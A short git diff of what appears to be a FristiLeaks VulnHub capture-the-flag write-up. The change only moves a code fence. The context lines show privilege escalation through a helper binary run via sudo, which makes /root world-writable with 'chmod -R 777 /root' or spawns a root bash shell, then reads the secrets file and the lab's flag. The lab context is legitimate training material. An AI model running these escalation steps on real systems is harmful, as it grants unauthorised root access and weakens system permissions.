@@ -48,7 +48,7 @@ sudo -u fristi ./doCom chmod -R 777 /root
 or
 ```shell
 sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
-```
+
 Final:
 bash-4.1# cat fristileaks_secrets.txt
 cat fristileaks_secrets.txt
@@ -57,3 +57,4 @@ I wonder if you beat it in the maximum 4 hours it's supposed to take!
 Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
 
 Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+```
